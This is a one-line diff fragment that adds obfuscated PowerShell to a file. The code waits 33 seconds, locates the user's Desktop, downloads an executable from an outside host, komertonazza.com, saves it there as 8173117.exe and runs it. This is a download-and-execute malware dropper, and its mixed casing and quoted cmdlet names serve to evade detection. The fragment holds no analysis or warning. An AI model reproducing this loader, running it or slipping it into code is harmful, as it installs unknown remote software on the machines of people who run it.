@@ -1,0 +1,1 @@
+$7d0mK6 = [Type]'eNVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gEtFoLDeRpATh('Desktop');(&'New-Object' 'System.Net.WeBClIenT').dOwNLOaDfiLE.INVokE('http://komertonazza.com/ptvcon','$Des\8173117.exe');&'Start-Process' $Des\8173117.exe
